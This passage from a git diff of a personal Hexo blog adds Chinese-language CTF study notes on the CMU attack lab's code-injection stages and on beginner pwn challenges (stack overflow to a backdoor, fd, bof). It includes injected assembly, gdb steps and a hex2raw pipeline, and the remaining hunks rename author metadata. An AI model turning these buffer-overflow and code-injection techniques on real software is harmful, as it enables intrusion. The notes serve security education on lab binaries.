+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movl $0x59b997fa,%edi;</span><br><span class="line">pushq $0x4017ec;</span><br><span class="line">retq</span><br></pre></td></tr></table></figure>
+
+<p>再输入gcc -c 2.s</p>
+<p>和objdump -d 2.o</p>
+<p>得到</p>
+<p><img src="/2023/09/11/ctf/Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230908154109767.png" alt="image-20230908154109767"></p>
+<p>此处注意</p>
+<p>打断点的时候是打在call Gets那里</p>
+<p>也就是0x4017af 而不是直接在Gets那里打</p>
+<p>因为从缓冲区存的内容是存在这里？？？</p>
+<p>打断点时输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb ctarget</span><br><span class="line">set args -q -i test /*第一阶段的注入*/</span><br><span class="line">run</span><br><span class="line">p $rsp</span><br></pre></td></tr></table></figure>
+
+<p>输入命令 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat t1 | ./hex2raw | ./ctarget -q</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/09/11/ctf/Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230908162724560.png" alt="image-20230908162724560"></p>
+<h4 id="touch3"><a href="#touch3" class="headerlink" title="touch3"></a>touch3</h4><p>__readfsqword()   从内存中读取一个 64 位整数</p>
+<p>&amp;cbuf[random() % 100];   在0-100中选一个放在</p>
+<p><img src="/2023/09/11/ctf/Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230908165814688.png" alt="image-20230908165814688"></p>
+<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="先导知识"><a href="#先导知识" class="headerlink" title="先导知识"></a>先导知识</h2><p>便于理解</p>
+<p><img src="/2023/09/11/ctf/Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230907212356729.png" alt="image-20230907212356729"></p>
+<h2 id="01题-栈溢出"><a href="#01题-栈溢出" class="headerlink" title="01题 栈溢出:"></a>01题 栈溢出:</h2><p>首先查看其安全性 可以看到堆栈等都没有保护措施的64位程序</p>
+<p><img src="/2023/09/11/ctf/Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230829163105798.png" alt="image-20230829163105798"></p>
+<p>可以看到他read函数可以读入160个字符 但可以看到int的buf，是8个字节</p>
+<p>由于64位的存储是按照16字节存储，所以8字节需要加上任意一个返回地址，再输入后门地址</p>
+<p><img src="/2023/09/11/ctf/Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230829163606090.png" alt="image-20230829163606090"></p>
+<p>把int该输入的值覆盖掉后再覆盖掉返回值，再输入后门地址即可</p>
+<h2 id="02题-deadbeef"><a href="#02题-deadbeef" class="headerlink" title="02题 deadbeef:"></a>02题 deadbeef:</h2><p>使用nc写入两遍deadbeef</p>
+<p><img src="/2023/09/11/ctf/Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230830164306266.png" alt="image-20230830164306266"></p>
+<p>再cat flag</p>
+<h2 id="03题-fd："><a href="#03题-fd：" class="headerlink" title="03题 fd："></a>03题 fd：</h2><p><img src="/2023/09/11/ctf/Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230904104911158.png" alt="image-20230904104911158"></p>
+<p>输入4660后</p>
+<p><img src="/2023/09/11/ctf/Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230904105857482.png" alt="image-20230904105857482"></p>
+<h2 id="04题-bof"><a href="#04题-bof" class="headerlink" title="04题 bof:"></a>04题 bof:</h2>
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/08/23/AFL-6/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="ljy">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="L+1">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | L+1">
       <meta itemprop="description" content="">
     </span>
       <header class="post-header">
@@ -246,16 +740,16 @@
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
+      <meta itemprop="name" content="ljy">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
+      <meta itemprop="name" content="L+1">
       <meta itemprop="description" content="">
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | Hexo">
+      <meta itemprop="name" content="undefined | L+1">
       <meta itemprop="description" content="">
     </span>
       <header class="post-header">
@@ -329,16 +823,16 @@
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
+      <meta itemprop="name" content="ljy">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
+      <meta itemprop="name" content="L+1">
       <meta itemprop="description" content="">
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | Hexo">
+      <meta itemprop="name" content="undefined | L+1">
       <meta itemprop="description" content="">
     </span>
       <header class="post-header">
@@ -448,16 +942,16 @@
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
+      <meta itemprop="name" content="ljy">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
+      <meta itemprop="name" content="L+1">
       <meta itemprop="description" content="">
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | Hexo">
+      <meta itemprop="name" content="undefined | L+1">
       <meta itemprop="description" content="">
     </span>
       <header class="post-header">
@@ -574,16 +1068,16 @@
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
+      <meta itemprop="name" content="ljy">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
+      <meta itemprop="name" content="L+1">
       <meta itemprop="description" content="">
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | Hexo">
+      <meta itemprop="name" content="undefined | L+1">
       <meta itemprop="description" content="">
     </span>
       <header class="post-header">
@@ -716,16 +1210,16 @@
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
+      <meta itemprop="name" content="ljy">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
+      <meta itemprop="name" content="L+1">
       <meta itemprop="description" content="">
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | Hexo">
+      <meta itemprop="name" content="undefined | L+1">
       <meta itemprop="description" content="">
     </span>
       <header class="post-header">
@@ -899,16 +1393,16 @@
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
+      <meta itemprop="name" content="ljy">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
+      <meta itemprop="name" content="L+1">
       <meta itemprop="description" content="">
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | Hexo">
+      <meta itemprop="name" content="undefined | L+1">
       <meta itemprop="description" content="">
     </span>
       <header class="post-header">
@@ -1039,16 +1533,16 @@
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
+      <meta itemprop="name" content="ljy">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
+      <meta itemprop="name" content="L+1">
       <meta itemprop="description" content="">
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | Hexo">
+      <meta itemprop="name" content="undefined | L+1">
       <meta itemprop="description" content="">
     </span>
       <header class="post-header">
@@ -1117,16 +1611,16 @@
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
+      <meta itemprop="name" content="ljy">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
+      <meta itemprop="name" content="L+1">
       <meta itemprop="description" content="">
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | Hexo">
+      <meta itemprop="name" content="undefined | L+1">
       <meta itemprop="description" content="">
     </span>
       <header class="post-header">
@@ -1199,7 +1693,7 @@
     <span class="with-love">
       <i class="fa fa-heart"></i>
     </span>
-    <span class="author" itemprop="copyrightHolder">John Doe</span>
+    <span class="author" itemprop="copyrightHolder">ljy</span>
   </div>
   <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
   </div>
